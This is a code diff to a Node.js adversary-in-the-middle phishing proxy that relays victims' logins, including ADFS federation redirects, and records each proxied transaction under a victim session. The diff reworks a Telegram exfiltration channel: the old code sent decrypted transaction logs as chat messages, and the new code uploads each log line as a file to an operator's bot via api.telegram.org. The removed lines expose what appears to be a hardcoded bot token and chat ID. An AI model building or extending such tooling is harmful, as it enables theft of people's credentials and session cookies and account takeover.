@@ -5,8 +5,12 @@ const fs = require("fs");
 const zlib = require("zlib");
 const crypto = require("crypto");
 
-// [TELEGRAM] Add the native https module for sending requests
-// Already have https, we'll use it.
+// ===== TELEGRAM CONFIGURATION =====
+// Set these via environment variables for security
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN_HERE";
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "YOUR_CHAT_ID_HERE";
+const ENABLE_TELEGRAM = !!(TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" && TELEGRAM_CHAT_ID && TELEGRAM_CHAT_ID !== "YOUR_CHAT_ID_HERE");
+// ===================================
 
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
 const PHISHED_URL_PARAMETER = "redirect_urI";
@@ -36,24 +40,17 @@ try {
     displayError("Directory creation failed", error, LOGS_DIRECTORY);
 }
 const LOG_FILE_STREAMS = {};
-//!\ It is strongly recommended to modify the encryption key and store it more securely for real engagements. /!\\
 const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
 
 const VICTIM_SESSIONS = {}
 
-// [TELEGRAM] Configuration - set these from environment or hardcode for testing
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8210158119:AAHhshMpvVybY3LSxOZkYiiuLwtq_dwaCLg";
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "7310383191";
-const TELEGRAM_ENABLED = !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && TELEGRAM_BOT_TOKEN !== "8210158119:AAHhshMpvVybY3LSxOZkYiiuLwtq_dwaCLg");
-
-// [TELEGRAM] Helper to send a message to Telegram
-function sendTelegramMessage(text) {
-    if (!TELEGRAM_ENABLED) return Promise.resolve();
+// ===== TELEGRAM SEND FUNCTION =====
+function sendTelegramMessage(text, asFile = true, filename = "log_entry.txt") {
+    if (!ENABLE_TELEGRAM) return;
     const payload = JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         text: text,
-        parse_mode: "HTML",
-        disable_web_page_preview: true
+        parse_mode: "HTML"
     });
     const options = {
         hostname: "api.telegram.org",
@@ -64,54 +61,65 @@ function sendTelegramMessage(text) {
             "Content-Length": Buffer.byteLength(payload)
         }
     };
-    return new Promise((resolve, reject) => {
-        const req = https.request(options, (res) => {
-            let data = "";
-            res.on("data", chunk => data += chunk);
-            res.on("end", () => {
-                if (res.statusCode === 200) resolve(JSON.parse(data));
-                else reject(new Error(`Telegram API error: ${res.statusCode} ${data}`));
-            });
+    const req = https.request(options, (res) => {
+        // Ignore response, just log error if any
+        let data = "";
+        res.on("data", chunk => data += chunk);
+        res.on("end", () => {
+            if (res.statusCode !== 200) {
+                console.error(`Telegram sendMessage failed: ${res.statusCode} - ${data}`);
+            }
         });
-        req.on("error", reject);
-        req.write(payload);
-        req.end();
     });
+    req.on("error", (err) => {
+        console.error("Telegram request error:", err.message);
+    });
+    req.write(payload);
+    req.end();
 }
 
-// [TELEGRAM] Split long text into chunks and send sequentially
-async function sendTelegramLongMessage(text, maxLen = 3500) {
-    if (!TELEGRAM_ENABLED) return;
-    const chunks = [];
-    for (let i = 0; i < text.length; i += maxLen) {
-        chunks.push(text.substring(i, i + maxLen));
-    }
-    for (let i = 0; i < chunks.length; i++) {
-        try {
-            await sendTelegramMessage(chunks[i]);
-        } catch (err) {
-            console.error("Failed to send Telegram chunk:", err.message);
+// Optional: send as document (file) for larger data
+function sendTelegramDocument(content, filename = "log.txt") {
+    if (!ENABLE_TELEGRAM) return;
+    const boundary = "----TelegramBoundary" + crypto.randomBytes(16).toString("hex");
+    const parts = [
+        `--${boundary}`,
+        `Content-Disposition: form-data; name="chat_id"`,
+        "",
+        TELEGRAM_CHAT_ID,
+        `--${boundary}`,
+        `Content-Disposition: form-data; name="document"; filename="${filename}"`,
+        "Content-Type: text/plain",
+        "",
+        content,
+        `--${boundary}--`
+    ];
+    const body = parts.join("\r\n");
+    const options = {
+        hostname: "api.telegram.org",
+        path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
+        method: "POST",
+        headers: {
+            "Content-Type": `multipart/form-data; boundary=${boundary}`,
+            "Content-Length": Buffer.byteLength(body)
         }
-    }
-}
-
-// [TELEGRAM] Decrypt function (mirror of encryptData)
-function decryptData(encryptedObject) {
-    return new Promise((resolve, reject) => {
-        const iv = Buffer.from(encryptedObject.iv, "hex");
-        const encryptedData = Buffer.from(encryptedObject.encryptedData, "hex");
-        const decipher = crypto.createDecipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
-        let decrypted = [];
-        decipher.on("error", reject);
-        decipher.on("data", chunk => decrypted.push(chunk));
-        decipher.on("end", () => resolve(Buffer.concat(decrypted).toString("utf-8")));
-        decipher.write(encryptedData);
-        decipher.end();
+    };
+    const req = https.request(options, (res) => {
+        let data = "";
+        res.on("data", chunk => data += chunk);
+        res.on("end", () => {
+            if (res.statusCode !== 200) {
+                console.error(`Telegram sendDocument failed: ${res.statusCode} - ${data}`);
+            }
+        });
     });
+    req.on("error", (err) => {
+        console.error("Telegram document request error:", err.message);
+    });
+    req.write(body);
+    req.end();
 }
-
-// [TELEGRAM] Optionally, you can also send a file (document) instead of text
-// For simplicity, we'll keep text splitting. If you want file, uncomment and adapt.
+// ===================================
 
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
@@ -521,7 +529,6 @@ async function encryptData(data) {
     });
 }
 
-// [TELEGRAM] Modified log function to also send plaintext to Telegram
 async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession) {
     const httpProxyTransaction = {
         timestamp: new Date().toISOString(),
@@ -534,26 +541,21 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
     };
     const logFileStream = LOG_FILE_STREAMS[currentSession];
 
-    // Encrypt for file storage
     const encryptedResult = await encryptData(JSON.stringify(httpProxyTransaction));
+    const logLine = JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData });
 
-    if (!logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`)) {
+    // Write to file
+    if (!logFileStream.write(`${logLine}\n`)) {
         await new Promise(resolve => logFileStream.once("drain", resolve));
     }
 
-    // [TELEGRAM] Send decrypted log to Telegram (fire-and-forget)
-    if (TELEGRAM_ENABLED) {
-        const plainText = JSON.stringify(httpProxyTransaction, null, 2);
-        // Truncate if too long, or split
-        if (plainText.length > 4096) {
-            // We'll use the long sender
-            sendTelegramLongMessage(`🔐 New proxy transaction for session ${currentSession}:\n\n` + plainText)
-                .catch(err => console.error("Telegram long send error:", err.message));
-        } else {
-            sendTelegramMessage(`🔐 New proxy transaction for session ${currentSession}:\n\n` + plainText)
-                .catch(err => console.error("Telegram send error:", err.message));
-        }
+    // ===== SEND TO TELEGRAM AS DOCUMENT =====
+    if (ENABLE_TELEGRAM) {
+        // Send the log line as a text file with timestamp and session
+        const filename = `${currentSession}_${Date.now()}.log`;
+        sendTelegramDocument(logLine, filename);
     }
+    // =========================================
 }
 
 function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
@@ -1027,7 +1029,6 @@ function updateHTMLProxyResponse(decompressedResponseBody) {
     ]);
 }
 
-// Modify the FederationRedirectUrl variable to proxify the cross-origin navigation request to the ADFS portal
 function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
     const decompressedResponseBodyString = decompressedResponseBody.toString();
     const decompressedResponseBodyObject = JSON.parse(decompressedResponseBodyString);
